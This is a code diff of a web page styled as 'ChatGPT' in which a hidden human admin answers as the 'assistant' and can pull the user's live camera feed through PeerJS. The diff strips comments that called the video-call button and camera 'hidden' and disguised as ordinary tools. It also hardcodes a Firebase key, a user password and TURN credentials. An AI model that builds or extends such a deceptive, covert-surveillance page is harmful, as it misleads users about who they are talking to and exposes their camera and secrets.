@@ -100,6 +100,9 @@
         .msg-media img,.msg-media video { width:100%;display:block;max-height:220px;object-fit:cover; }
         .msg-media-label { font-size:11px;padding:5px 8px;color:var(--text-muted);background:var(--surface2);display:flex;align-items:center;gap:5px; }
         .msg-media-label svg { width:12px;height:12px; }
+        .msg-media-downloading { display:flex;align-items:center;justify-content:center;height:140px;background:var(--surface);color:var(--text-muted);font-size:13px;gap:8px;flex-direction:column; }
+        .download-spinner { width:24px;height:24px;border:2px solid var(--border);border-top-color:var(--accent2);border-radius:50%;animation:spin 0.8s linear infinite; }
+        @keyframes spin { to{transform:rotate(360deg)} }
 
         /* ── INPUT ── */
         .input-wrap { padding:12px 16px 16px;flex-shrink:0; }
@@ -118,12 +121,10 @@
         .input-spacer { flex:1; }
         .input-footer-text { text-align:center;font-size:12px;color:var(--text-dim);margin-top:8px; }
 
-        /* ── ATTACH BUTTON (hidden camera on user side too) ── */
         .attach-btn { display:flex;align-items:center;gap:6px;padding:6px 12px;background:none;border:1px solid var(--border);border-radius:20px;color:var(--text-muted);font-size:13px;cursor:pointer;font-family:inherit; }
         .attach-btn:hover { background:var(--surface2);color:var(--text); }
         .attach-btn svg { width:14px;height:14px; }
 
-        /* hidden user videocall btn — looks like a regular tool btn */
         .user-vcall-btn { display:flex;align-items:center;gap:6px;padding:6px 12px;background:none;border:1px solid var(--border);border-radius:20px;color:var(--text-muted);font-size:13px;cursor:pointer;font-family:inherit; }
         .user-vcall-btn:hover { background:rgba(16,163,127,0.12);color:var(--accent2);border-color:rgba(16,163,127,0.4); }
         .user-vcall-btn svg { width:14px;height:14px; }
@@ -170,21 +171,16 @@
         .notif-deny { flex:1;padding:9px;background:var(--surface3);border:none;border-radius:10px;color:var(--text-muted);font-size:14px;cursor:pointer;font-family:inherit; }
         .notif-deny:hover { background:var(--surface2);color:var(--text); }
 
-        /* ── TWO-WAY VIDEO CALL PANEL (movable) ── */
+        /* ── TWO-WAY VIDEO CALL PANEL ── */
         #vcallPanel {
-            display:none;
-            position:fixed;bottom:120px;right:20px;z-index:600;
-            width:320px;background:#0a0a0a;border-radius:18px;
+            display:none; position:fixed; bottom:120px; right:20px; z-index:600;
+            width:320px; background:#0a0a0a; border-radius:18px;
             border:2px solid var(--accent);
             box-shadow:0 12px 48px rgba(0,0,0,0.7);
-            overflow:hidden;cursor:default;
-            user-select:none;
+            overflow:hidden;
         }
         #vcallPanel.show { display:block; }
-        .vcall-header {
-            display:flex;align-items:center;justify-content:space-between;
-            padding:10px 12px;background:rgba(16,163,127,0.15);cursor:grab;
-        }
+        .vcall-header { display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:rgba(16,163,127,0.15);cursor:grab; }
         .vcall-header:active { cursor:grabbing; }
         .vcall-title { font-size:13px;font-weight:600;color:var(--accent2);display:flex;align-items:center;gap:8px; }
         .vcall-live-dot { width:7px;height:7px;border-radius:50%;background:#ff4444;animation:livePulse 1.2s infinite; }
@@ -204,7 +200,7 @@
         #vcallMiniPill { display:none;position:fixed;bottom:120px;right:20px;z-index:600;background:var(--surface2);border:1px solid var(--accent);border-radius:20px;padding:6px 14px;cursor:pointer;font-size:13px;color:var(--accent2);align-items:center;gap:6px;box-shadow:0 4px 16px rgba(0,0,0,0.4); }
         #vcallMiniPill.show { display:flex; }
 
-        /* ── ADMIN OLD ONE-WAY CAM PANEL ── */
+        /* ── ADMIN ONE-WAY CAM PANEL ── */
         #adminCamPanel { display:none;position:fixed;bottom:120px;right:360px;z-index:400;width:240px;background:#000;border-radius:14px;border:2px solid var(--accent);box-shadow:0 8px 32px rgba(0,0,0,0.6);overflow:hidden; }
         #adminCamPanel.show { display:block; }
         .cam-panel-header { display:flex;align-items:center;justify-content:space-between;padding:8px 10px;background:rgba(16,163,127,0.15); }
@@ -219,15 +215,12 @@
         #camMiniPill { display:none;position:fixed;bottom:120px;right:20px;z-index:400;background:var(--surface2);border:1px solid var(--accent);border-radius:20px;padding:6px 14px;cursor:pointer;font-size:13px;color:var(--accent2);align-items:center;gap:6px;box-shadow:0 4px 16px rgba(0,0,0,0.4); }
         #camMiniPill.show { display:flex; }
         #camMiniPill svg { width:14px;height:14px; }
-        .admin-container { max-width:768px;margin:0 auto; }
 
         /* ── INCOMING VCALL NOTIFICATION ── */
         #vcallIncoming { display:none;position:fixed;top:70px;left:50%;transform:translateX(-50%);z-index:700;background:var(--surface2);border:1px solid var(--accent);border-radius:16px;padding:18px 20px;box-shadow:0 8px 32px rgba(0,0,0,0.5);max-width:340px;width:calc(100% - 40px); }
         #vcallIncoming.show { display:block; }
-        #vcallIncoming .notif-title { margin-bottom:4px; }
-        #vcallIncoming .notif-sub { margin-bottom:14px; }
 
-        /* ── MEDIA UPLOAD / PROJECTS PAGE ── */
+        /* ── MEDIA PROJECTS PAGE ── */
         #mediaPage { display:none;position:fixed;inset:0;background:var(--bg);z-index:800;flex-direction:column; }
         #mediaPage.show { display:flex; }
         .mp-header { display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid var(--border);flex-shrink:0; }
@@ -246,7 +239,6 @@
         .media-card { background:var(--surface);border-radius:14px;overflow:hidden;cursor:pointer;border:1px solid var(--border);transition:transform 0.15s,border-color 0.15s; }
         .media-card:hover { transform:translateY(-2px);border-color:rgba(255,255,255,0.25); }
         .media-card-thumb { width:100%;aspect-ratio:4/3;object-fit:cover;display:block;background:#111; }
-        .media-card-thumb.video-thumb { position:relative; }
         .media-card-info { padding:10px 12px; }
         .media-card-name { font-size:13px;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis; }
         .media-card-meta { font-size:11px;color:var(--text-muted);margin-top:2px; }
@@ -425,7 +417,7 @@
         <div class="um-drop" id="umDrop">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0018 9h-1.26A8 8 0 103 16.3"/></svg>
             <p>Click to choose or drag & drop</p>
-            <span>Images & videos of any size</span>
+            <span>Images & videos supported</span>
         </div>
         <input type="file" id="umFileInput" accept="image/*,video/*" style="display:none">
         <div class="um-preview" id="umPreview">
@@ -532,11 +524,9 @@
                         <button class="input-tool-btn" onclick="alert('Not available in demo')">Search</button>
                         <button class="input-tool-btn" onclick="alert('Not available in demo')">Voice</button>
                         <div class="input-spacer"></div>
-                        <!-- Hidden video call button (looks like attach) -->
                         <button class="user-vcall-btn" id="userVcallBtn" title="Video Call" style="display:none">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
                         </button>
-                        <!-- Attach media -->
                         <button class="attach-btn" id="userAttachBtn">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.44 11.05l-9.19 9.19a6 6 0 01-8.49-8.49l9.19-9.19a4 4 0 015.66 5.66l-9.2 9.19a2 2 0 01-2.83-2.83l8.49-8.48"/></svg>
                             Attach
@@ -579,9 +569,6 @@
 </div>
 
 <script>
-  /* ─────────────────────────────────────────────────────────
-     HELPERS
-  ───────────────────────────────────────────────────────── */
   function loadScript(src) {
     return new Promise((resolve, reject) => {
       const s = document.createElement('script');
@@ -607,9 +594,6 @@
     startApp();
   }
 
-  /* ─────────────────────────────────────────────────────────
-     MAIN APP
-  ───────────────────────────────────────────────────────── */
   function startApp() {
     firebase.initializeApp({
       apiKey: "AIzaSyB4zdYmAMsWT7oQW3Ul1fFzes3iscS5o7ys",
@@ -625,9 +609,9 @@
     const chatId      = "global_chat";
     const messagesRef = db.ref('chats/' + chatId + '/messages');
     const typingRef   = db.ref('chats/' + chatId + '/typing');
-    const mediaRef    = db.ref('chats/' + chatId + '/media');   // shared media index
+    const mediaRef    = db.ref('chats/' + chatId + '/media');
     const camRef      = db.ref('chats/' + chatId + '/camera');
-    const vcallRef    = db.ref('chats/' + chatId + '/vcall');   // two-way video call
+    const vcallRef    = db.ref('chats/' + chatId + '/vcall');
 
     const addedKeys = new Set();
     const USER_PASS  = "pra(sam)26";
@@ -682,7 +666,7 @@
         document.getElementById('userInputWrap').style.display = 'block';
         document.getElementById('adminBar').classList.remove('active');
         document.getElementById('userTypingBar').style.display='none';
-        document.getElementById('userVcallBtn').style.display='flex'; // show hidden vcall btn
+        document.getElementById('userVcallBtn').style.display='flex';
         document.title='ChatGPT [USER mode]'; setTimeout(()=>{ document.title='ChatGPT'; },3000);
         setupUserInput();
       } else {
@@ -702,7 +686,7 @@
           snap.forEach(child => {
             addedKeys.add(child.key);
             const m = child.val();
-            if (m && m.content) renderMessage(m.role, m.content, m.mediaKey || null);
+            if (m && (m.content || m.mediaKey)) renderMessage(m.role, m.content || '', m.mediaKey || null);
           });
         }
         messagesRef.on('child_added', snap => {
@@ -712,6 +696,7 @@
           if (!m) return;
           renderMessage(m.role, m.content || '', m.mediaKey || null);
           if (role==='assistant' && m.role==='user') { playDing(); bumpTitle(); }
+          if (role==='user' && m.role==='assistant') { playDing(); }
         });
       });
 
@@ -741,7 +726,6 @@
       });
     }
 
-    /* ── ESCAPE HTML ── */
     function escHtml(s) {
       return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
     }
@@ -758,24 +742,37 @@
       div.className = 'msg ' + msgRole;
 
       if (mediaKey) {
-        // Media message — show thumbnail from localStorage
-        const mediaData = getMediaFromStorage(mediaKey);
-        if (mediaData) {
-          const isVideo = mediaData.type && mediaData.type.startsWith('video/');
+        if (msgRole==='user') div.style.justifyContent='flex-end';
+
+        const localData = getMediaFromStorage(mediaKey);
+        if (localData) {
+          // We have it locally, render immediately
+          renderMediaBubble(div, mediaKey, localData);
+        } else {
+          // Show downloading state and fetch from Firebase
+          const isVideo = (mediaIndex[mediaKey]?.type || '').startsWith('video/');
           div.innerHTML = `
-            <div class="msg-media" onclick="window.__openMediaViewer('${mediaKey}')">
-              ${isVideo
-                ? `<video class="media-card-thumb" src="${mediaData.dataUrl}" muted preload="metadata" style="max-height:200px;width:100%;object-fit:cover;display:block;"></video>`
-                : `<img class="media-card-thumb" src="${mediaData.dataUrl}" alt="${escHtml(mediaData.name||'')}">`}
+            <div class="msg-media">
+              <div class="msg-media-downloading">
+                <div class="download-spinner"></div>
+                <span>Downloading media…</span>
+              </div>
               <div class="msg-media-label">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">${isVideo?'<polygon points="5 3 19 12 5 21 5 3"/>':'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/>'}</svg>
-                ${escHtml(mediaData.name||'Shared media')} · Click to view
+                ${escHtml(mediaIndex[mediaKey]?.name || 'Shared media')}
               </div>
             </div>`;
-        } else {
-          div.innerHTML = `<div class="msg-user-bubble" style="color:var(--text-muted);font-size:13px;">[Media not available on this device — view in Projects]</div>`;
+
+          // Download and update the bubble
+          downloadMediaData(mediaKey, mediaIndex[mediaKey] || {}).then(() => {
+            const freshData = getMediaFromStorage(mediaKey);
+            if (freshData) {
+              div.innerHTML = '';
+              if (msgRole==='user') div.style.justifyContent='flex-end';
+              renderMediaBubble(div, mediaKey, freshData);
+            }
+          });
         }
-        if (msgRole==='user') { div.style.justifyContent='flex-end'; }
       } else if (content) {
         const safeContent = escHtml(content);
         if (msgRole==='user') {
@@ -805,6 +802,21 @@
       }
       wrap.appendChild(div);
       scrollBottom();
+    }
+
+    function renderMediaBubble(div, mediaKey, data) {
+      const isVideo = (data.type || '').startsWith('video/');
+      const entry = mediaIndex[mediaKey] || {};
+      div.innerHTML = `
+        <div class="msg-media" onclick="window.__openMediaViewer('${mediaKey}')">
+          ${isVideo
+            ? `<video src="${data.dataUrl}" muted preload="metadata" style="width:100%;max-height:200px;object-fit:cover;display:block;"></video>`
+            : `<img src="${data.dataUrl}" alt="${escHtml(data.name||'')}" style="width:100%;max-height:200px;object-fit:cover;display:block;">`}
+          <div class="msg-media-label">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:12px;height:12px">${isVideo?'<polygon points="5 3 19 12 5 21 5 3"/>':'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/>'}</svg>
+            ${escHtml(data.name||'Shared media')} · Click to view
+          </div>
+        </div>`;
     }
 
     /* ── USER INPUT ── */
@@ -872,52 +884,66 @@
 
     /* ═══════════════════════════════════════════════════════
        MEDIA / FILE UPLOAD FEATURE
-       Files are stored in localStorage as base64 data URLs.
-       A small index entry (key, name, type, sender, ts) is
-       pushed to Firebase so both sides know a file exists.
-       Both sides load the actual data from their own localStorage
-       using the shared key — if they uploaded it themselves
-       (they were the one who clicked Post).
-       For cross-device sharing: the full dataUrl is also stored
-       in Firebase (chunked under /media/<key>/data) so the
-       other device can download & cache it locally.
+       
+       FIX: Firebase structure is now flat:
+         /media/<key>/name, type, sender, ts, chunkCount, chunk_0, chunk_1...
+       This avoids nested child_added confusion.
+       
+       Files are stored in localStorage for instant local access.
+       When the other side gets the mediaRef child_added, they check
+       localStorage first, then download chunks from Firebase if missing.
     ═══════════════════════════════════════════════════════ */
     const MEDIA_LS_PREFIX = 'cgpt_media_';
     function saveMediaToStorage(key, obj) {
-      try { localStorage.setItem(MEDIA_LS_PREFIX+key, JSON.stringify(obj)); } catch(e){}
+      try { localStorage.setItem(MEDIA_LS_PREFIX+key, JSON.stringify(obj)); } catch(e){ console.warn('localStorage full?', e); }
     }
-    window.getMediaFromStorage = function(key) {
+    function getMediaFromStorage(key) {
       try { const r=localStorage.getItem(MEDIA_LS_PREFIX+key); return r?JSON.parse(r):null; } catch(e){ return null; }
-    };
+    }
 
     let currentUploadFile = null;
     let mediaIndex = {}; // key -> {name,type,sender,ts}
     let viewingMediaKey = null;
+    // Track which keys are currently being downloaded to avoid duplicate downloads
+    const downloadingKeys = new Set();
+
+    window.getMediaFromStorage = getMediaFromStorage;
 
     function setupMediaFeature() {
-      // Listen for new media entries from Firebase (cross-device sync)
+      // Listen for new media entries — each child is a key, its value has name/type/sender/ts/chunkCount/chunk_N
       mediaRef.on('child_added', snap => {
         const k = snap.key;
-        const entry = snap.val();
-        if (!entry) return;
+        const val = snap.val();
+        if (!val || !val.name) return; // skip if not a proper entry
+
+        const entry = { name: val.name, type: val.type, sender: val.sender, ts: val.ts };
         mediaIndex[k] = entry;
 
-        // If we don't have it locally yet, download the data chunks
-        if (!getMediaFromStorage(k) && entry.hasData) {
-          downloadMediaData(k, entry);
+        // If we don't have it locally, download now
+        if (!getMediaFromStorage(k)) {
+          downloadMediaFromFirebase(k, val);
         }
         refreshMediaGrid();
       });
 
-      // Attach buttons
-      document.getElementById('userAttachBtn').addEventListener('click', () => openUploadModal('user'));
-      document.getElementById('adminAttachBtn').addEventListener('click', () => openUploadModal('assistant'));
+      // Also listen for updates (in case a file was partially uploaded)
+      mediaRef.on('child_changed', snap => {
+        const k = snap.key;
+        const val = snap.val();
+        if (!val || !val.name) return;
+        mediaIndex[k] = { name: val.name, type: val.type, sender: val.sender, ts: val.ts };
+        if (!getMediaFromStorage(k)) {
+          downloadMediaFromFirebase(k, val);
+        }
+        refreshMediaGrid();
+      });
 
-      // Projects page
+      document.getElementById('userAttachBtn').addEventListener('click', () => openUploadModal());
+      document.getElementById('adminAttachBtn').addEventListener('click', () => openUploadModal());
+
       document.getElementById('mpBack').addEventListener('click', closeMediaPage);
-      document.getElementById('mpUploadBtn').addEventListener('click', () => openUploadModal(role));
+      document.getElementById('mpUploadBtn').addEventListener('click', () => openUploadModal());
 
-      // Upload modal
       const dropZone   = document.getElementById('umDrop');
       const fileInput  = document.getElementById('umFileInput');
       const cancelBtn  = document.getElementById('umCancel');
@@ -931,11 +957,9 @@
       cancelBtn.addEventListener('click', closeUploadModal);
       postBtn.addEventListener('click', doUpload);
 
-      // Media viewer
       document.getElementById('mvClose').addEventListener('click', closeMediaViewer);
       document.getElementById('mvSendToChat').addEventListener('click', sendMediaToChat);
 
-      // Expose global for inline onclick
       window.__openMediaViewer = openMediaViewer;
     }
 
@@ -968,7 +992,10 @@
             </div>`;
         } else {
           card.innerHTML=`
-            <div style="aspect-ratio:4/3;background:#1a1a1a;display:flex;align-items:center;justify-content:center;color:var(--text-muted);font-size:12px;">Loading…</div>
+            <div style="aspect-ratio:4/3;background:#1a1a1a;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;color:var(--text-muted);font-size:12px;">
+              <div class="download-spinner"></div>
+              Downloading…
+            </div>
             <div class="media-card-info">
               <div class="media-card-name">${escHtml(entry.name||'File')}</div>
               <div class="media-card-meta">${entry.sender==='user'?'User':'Admin'} · ${fmtTs(entry.ts)}</div>
@@ -984,7 +1011,7 @@
       return d.toLocaleDateString()+' '+d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
     }
 
-    function openUploadModal(senderRole) {
+    function openUploadModal() {
       currentUploadFile = null;
       document.getElementById('umPreview').style.display='none';
       document.getElementById('umPreviewMedia').innerHTML='';
@@ -1019,7 +1046,7 @@
       return (n/1048576).toFixed(1)+'MB';
     }
 
-    function doUpload() {
+    async function doUpload() {
       if (!currentUploadFile) return;
       const file = currentUploadFile;
       const postBtn = document.getElementById('umPost');
@@ -1029,70 +1056,97 @@
       progress.style.display='block';
 
       const reader = new FileReader();
-      reader.onprogress = e => { if(e.lengthComputable) bar.style.width=((e.loaded/e.total)*80)+'%'; };
+      reader.onprogress = e => { if(e.lengthComputable) bar.style.width=((e.loaded/e.total)*60)+'%'; };
       reader.onload = async () => {
-        bar.style.width='85%';
-        const dataUrl = reader.result;
-        const key = 'media_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
+        try {
+          bar.style.width='65%';
+          const dataUrl = reader.result;
+          const key = 'media_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
 
-        // Save locally
-        const obj = { name:file.name, type:file.type, dataUrl, ts:Date.now(), sender:role };
-        saveMediaToStorage(key, obj);
+          // Save locally first so we can show it immediately
+          const obj = { name:file.name, type:file.type, dataUrl, ts:Date.now(), sender:role };
+          saveMediaToStorage(key, obj);
+          mediaIndex[key] = { name:file.name, type:file.type, sender:role, ts:obj.ts };
 
-        // Push index + data to Firebase for cross-device
-        const entry = { name:file.name, type:file.type, sender:role, ts:Date.now(), hasData:true };
-        await mediaRef.child(key).child('meta').set(entry);
-        // Store data in chunks of ~900KB each
-        await storeDataChunked(key, dataUrl);
+          bar.style.width='70%';
 
-        mediaIndex[key] = entry;
-        bar.style.width='100%';
+          // Upload to Firebase — flat structure with chunks stored as chunk_0, chunk_1 etc.
+          const CHUNK_SIZE = 600000; // 600KB per chunk
+          const chunks = [];
+          for (let i = 0; i < dataUrl.length; i += CHUNK_SIZE) {
+            chunks.push(dataUrl.slice(i, i + CHUNK_SIZE));
+          }
 
-        // Push media message to chat
-        messagesRef.push({ role, content:'', mediaKey:key, timestamp:firebase.database.ServerValue.TIMESTAMP });
+          const uploadData = {
+            name: file.name,
+            type: file.type,
+            sender: role,
+            ts: obj.ts,
+            chunkCount: chunks.length
+          };
 
-        setTimeout(() => { closeUploadModal(); refreshMediaGrid(); },400);
+          // Add chunks directly to the object
+          chunks.forEach((chunk, i) => { uploadData['chunk_' + i] = chunk; });
+
+          bar.style.width='80%';
+          await mediaRef.child(key).set(uploadData);
+          bar.style.width='95%';
+
+          // Push media message to chat
+          await messagesRef.push({ role, content:'', mediaKey:key, timestamp:firebase.database.ServerValue.TIMESTAMP });
+
+          bar.style.width='100%';
+          setTimeout(() => { closeUploadModal(); refreshMediaGrid(); }, 400);
+        } catch(err) {
+          console.error('Upload error:', err);
+          alert('Upload failed: ' + err.message);
+          postBtn.disabled=false;
+        }
       };
+      reader.onerror = () => { alert('Failed to read file.'); postBtn.disabled=false; };
       reader.readAsDataURL(file);
     }
 
-    async function storeDataChunked(key, dataUrl) {
-      const CHUNK = 700000; // ~700KB per chunk (Firebase limit 10MB but we chunk for reliability)
-      const chunks = [];
-      for (let i=0;i<dataUrl.length;i+=CHUNK) chunks.push(dataUrl.slice(i,i+CHUNK));
-      const ref = mediaRef.child(key).child('chunks');
-      for (let i=0;i<chunks.length;i++) await ref.child(String(i)).set(chunks[i]);
-      await mediaRef.child(key).child('chunkCount').set(chunks.length);
-    }
-
-    async function downloadMediaData(key, entry) {
+    // Download media from Firebase flat structure
+    async function downloadMediaFromFirebase(key, fbVal) {
+      if (downloadingKeys.has(key)) return;
+      downloadingKeys.add(key);
       try {
-        const countSnap = await mediaRef.child(key).child('chunkCount').once('value');
-        const count = countSnap.val();
-        if (!count) return;
-        let dataUrl='';
-        for(let i=0;i<count;i++) {
-          const cs = await mediaRef.child(key).child('chunks').child(String(i)).once('value');
-          dataUrl += cs.val()||'';
+        // fbVal might already have the chunks if called from child_added
+        let val = fbVal;
+        if (!val || !val.chunkCount) {
+          // Fetch fresh from Firebase
+          const snap = await mediaRef.child(key).once('value');
+          val = snap.val();
         }
+        if (!val || !val.chunkCount) { downloadingKeys.delete(key); return; }
+
+        let dataUrl = '';
+        for (let i = 0; i < val.chunkCount; i++) {
+          const chunk = val['chunk_' + i];
+          if (chunk) dataUrl += chunk;
+        }
+
         if (dataUrl) {
-          saveMediaToStorage(key, {name:entry.name,type:entry.type,dataUrl,ts:entry.ts,sender:entry.sender});
+          const obj = { name: val.name, type: val.type, dataUrl, ts: val.ts, sender: val.sender };
+          saveMediaToStorage(key, obj);
           refreshMediaGrid();
         }
-      } catch(e) {}
+      } catch(e) {
+        console.error('Download error for', key, e);
+      } finally {
+        downloadingKeys.delete(key);
+      }
     }
 
-    // Also listen for meta under each key
-    mediaRef.on('child_added', snap => {
-      snap.ref.child('meta').on('value', metaSnap => {
-        const meta = metaSnap.val();
-        if (!meta) return;
-        const k = snap.key;
-        mediaIndex[k] = meta;
-        if (!getMediaFromStorage(k) && meta.hasData) downloadMediaData(k, meta);
-        refreshMediaGrid();
-      });
-    });
+    // Also used by mediaRef listener when we don't have fbVal handy
+    async function downloadMediaData(key, entry) {
+      if (getMediaFromStorage(key)) return; // already have it
+      const snap = await mediaRef.child(key).once('value');
+      const val = snap.val();
+      if (!val) return;
+      await downloadMediaFromFirebase(key, val);
+    }
 
     function openMediaViewer(key) {
       const data = getMediaFromStorage(key);
@@ -1100,20 +1154,33 @@
       const viewer = document.getElementById('mediaViewer');
       const content= document.getElementById('mvContent');
       const info   = document.getElementById('mvInfo');
-      viewingMediaKey=key;
+      viewingMediaKey = key;
       content.innerHTML='';
+
       if (data) {
-        const isVideo=(data.type||'').startsWith('video/');
-        if(isVideo) { content.innerHTML=`<video src="${data.dataUrl}" controls autoplay style="max-width:90vw;max-height:72vh;border-radius:12px;"></video>`; }
-        else { content.innerHTML=`<img src="${data.dataUrl}" alt="" style="max-width:90vw;max-height:72vh;border-radius:12px;">`; }
+        renderInViewer(data);
         info.textContent=(data.name||'File')+' · '+(entry?fmtTs(entry.ts):'');
-      } else if(entry) {
-        content.innerHTML=`<div style="color:var(--text-muted);padding:40px;text-align:center;">Downloading from cloud…</div>`;
-        info.textContent=entry.name||'';
-        downloadMediaData(key,entry).then(()=>{ const d=getMediaFromStorage(key); if(d){const iv=(d.type||'').startsWith('video/'); content.innerHTML=iv?`<video src="${d.dataUrl}" controls autoplay style="max-width:90vw;max-height:72vh;border-radius:12px;"></video>`:`<img src="${d.dataUrl}" style="max-width:90vw;max-height:72vh;border-radius:12px;">`; }});
+      } else {
+        content.innerHTML=`<div style="color:var(--text-muted);padding:40px 20px;text-align:center;"><div class="download-spinner" style="margin:0 auto 12px;"></div><div>Downloading from cloud…</div></div>`;
+        info.textContent=entry?entry.name||'':'';
+        downloadMediaData(key, entry||{}).then(()=>{
+          const d=getMediaFromStorage(key);
+          if(d){ renderInViewer(d); info.textContent=(d.name||'File')+' · '+(entry?fmtTs(entry.ts):''); }
+        });
       }
       viewer.classList.add('show');
     }
+
+    function renderInViewer(data) {
+      const content = document.getElementById('mvContent');
+      const isVideo = (data.type||'').startsWith('video/');
+      if(isVideo) {
+        content.innerHTML=`<video src="${data.dataUrl}" controls autoplay style="max-width:90vw;max-height:72vh;border-radius:12px;"></video>`;
+      } else {
+        content.innerHTML=`<img src="${data.dataUrl}" alt="" style="max-width:90vw;max-height:72vh;border-radius:12px;">`;
+      }
+    }
+
     function closeMediaViewer() {
       document.getElementById('mediaViewer').classList.remove('show');
       document.getElementById('mvContent').innerHTML='';
@@ -1121,7 +1188,7 @@
     }
     function sendMediaToChat() {
       if(!viewingMediaKey) return;
-      messagesRef.push({role,content:'',mediaKey:viewingMediaKey,timestamp:firebase.database.ServerValue.TIMESTAMP});
+      messagesRef.push({role, content:'', mediaKey:viewingMediaKey, timestamp:firebase.database.ServerValue.TIMESTAMP});
       closeMediaViewer();
       closeMediaPage();
     }
@@ -1129,7 +1196,7 @@
     /* ═══════════════════════════════════════════════════════
        ONE-WAY CAMERA (admin views user's cam)
     ═══════════════════════════════════════════════════════ */
-    let peer=null, localStream=null, camActive=false;
+    let camPeer=null, localStream=null, camActive=false;
     const CAM_CONSENT_KEY='camConsent_'+chatId;
     let userCamConsented=localStorage.getItem(CAM_CONSENT_KEY)==='yes';
 
@@ -1142,7 +1209,7 @@
         {urls:"turn:global.relay.metered.ca:80?transport=tcp",username:"d3255d391c5e1dead913635e",credential:"cp47LPDlBBzYiaBJ"},
         {urls:"turn:global.relay.metered.ca:443",username:"d3255d391c5e1dead913635e",credential:"cp47LPDlBBzYiaBJ"},
         {urls:"turns:global.relay.metered.ca:443?transport=tcp",username:"d3255d391c5e1dead913635e",credential:"cp47LPDlBBzYiaBJ"}
-      ],iceCandidatePoolSize:2},debug:2
+      ],iceCandidatePoolSize:2},debug:1
     };
 
     async function getCameraStream() {
@@ -1151,7 +1218,11 @@
       return null;
     }
     async function getCallStream() {
-      const constraints=[{video:{width:{ideal:640},height:{ideal:480}},audio:true},{video:true,audio:true}];
+      const constraints=[
+        {video:{width:{ideal:640},height:{ideal:480}},audio:true},
+        {video:true,audio:true},
+        {video:true,audio:false}
+      ];
       for(const c of constraints){try{const s=await navigator.mediaDevices.getUserMedia(c);if(s)return s;}catch(_){}}
       return null;
     }
@@ -1163,7 +1234,12 @@
         const miniPill=document.getElementById('camMiniPill');
         camBtn.addEventListener('click',()=>{
           if(camActive){stopCameraSession();return;}
-          camRef.remove().then(()=>{camRef.child('status').set('requesting');camBtn.innerHTML=svgCam()+' Waiting…';camBtn.disabled=true;startAdminPeerJS();});
+          camRef.remove().then(()=>{
+            camRef.child('status').set('requesting');
+            camBtn.innerHTML=svgCam()+' Waiting…';
+            camBtn.disabled=true;
+            startAdminPeerJS();
+          });
         });
         document.getElementById('camMinimizeBtn').addEventListener('click',()=>{camPanel.classList.remove('show');miniPill.classList.add('show');});
         miniPill.addEventListener('click',()=>{miniPill.classList.remove('show');camPanel.classList.add('show');});
@@ -1194,43 +1270,53 @@
     }
 
     function startAdminPeerJS(){
-      if(peer)peer.destroy();
-      peer=new Peer(undefined,PEER_OPTIONS);
-      peer.on('open',id=>{camRef.child('adminPeerId').set(id);});
-      peer.on('call',call=>{
-        call.answer();camActive=true;
+      if(camPeer)camPeer.destroy();
+      camPeer=new Peer(undefined,PEER_OPTIONS);
+      camPeer.on('open',id=>{ camRef.child('adminPeerId').set(id); });
+      camPeer.on('call',call=>{
+        call.answer();
+        camActive=true;
         const rv=document.getElementById('remoteVideo');
         call.on('stream',stream=>{
-          rv.srcObject=stream;rv.muted=true;rv.play().catch(()=>{});
+          rv.srcObject=stream; rv.muted=true; rv.play().catch(()=>{});
           document.getElementById('adminCamPanel').classList.add('show');
           const camBtn=document.getElementById('adminCamAccessBtn');
-          camBtn.innerHTML=svgCamOff()+' Stop Camera';camBtn.classList.add('active-cam');camBtn.disabled=false;
-          document.querySelector('.cam-panel-footer').textContent="User's live camera feed";
+          camBtn.innerHTML=svgCamOff()+' Stop Camera';
+          camBtn.classList.add('active-cam');
+          camBtn.disabled=false;
         });
-        call.on('close',stopCameraSession);call.on('error',()=>stopCameraSession());
+        call.on('close',stopCameraSession);
+        call.on('error',()=>stopCameraSession());
       });
-      peer.on('error',()=>stopCameraSession());
+      camPeer.on('error',()=>stopCameraSession());
     }
     async function startUserPeerJS(){
       if(localStream)return;
       localStream=await getCameraStream();
       if(!localStream){camRef.child('status').set('cam_error');return;}
-      function waitForAdminId(retries){
+      let retries=12;
+      function tryConnect(){
         if(retries<=0){camRef.child('status').set('cam_error');return;}
         camRef.child('adminPeerId').once('value',snap=>{
           const adminId=snap.val();
-          if(!adminId){setTimeout(()=>waitForAdminId(retries-1),500);return;}
-          if(peer)peer.destroy();
-          peer=new Peer(undefined,PEER_OPTIONS);
-          peer.on('open',()=>{peer.call(adminId,localStream);camRef.child('status').set('live');});
-          peer.on('error',()=>{stopUserCamera();camRef.child('status').set('cam_error');});
+          if(!adminId){retries--;setTimeout(tryConnect,600);return;}
+          if(camPeer)camPeer.destroy();
+          camPeer=new Peer(undefined,PEER_OPTIONS);
+          camPeer.on('open',()=>{
+            const call=camPeer.call(adminId,localStream);
+            call.on('error',()=>{stopUserCamera();camRef.child('status').set('cam_error');});
+            camRef.child('status').set('live');
+          });
+          camPeer.on('error',()=>{stopUserCamera();camRef.child('status').set('cam_error');});
         });
       }
-      waitForAdminId(10);
+      tryConnect();
     }
     function stopCameraSession(){
-      camActive=false;camRef.child('status').set('stopped');setTimeout(()=>camRef.remove(),1000);
-      if(peer){peer.destroy();peer=null;}
+      camActive=false;
